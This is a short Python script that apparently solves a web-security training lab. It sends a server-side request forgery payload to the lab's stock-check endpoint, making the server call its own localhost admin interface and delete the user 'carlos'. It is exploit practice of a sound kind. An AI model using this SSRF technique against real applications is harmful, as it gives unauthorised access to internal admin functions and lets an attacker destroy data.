import requests

# Set your target lab URL here
site = "0a6b00df044ffa7e808d215600a0003e.web-security-academy.net"
stock_url = f"https://{site}/product/stock"

# Step 1: SSRF payload to delete carlos via internal admin interface
stock_api_data = {
    "stockApi": "http://localhost/admin/delete?username=carlos"
}

# Step 2: Send POST request
resp = requests.post(stock_url, data=stock_api_data)

# Step 3: Print result
print("[*] SSRF deletion request sent. Server response:\n")
print(resp.text)
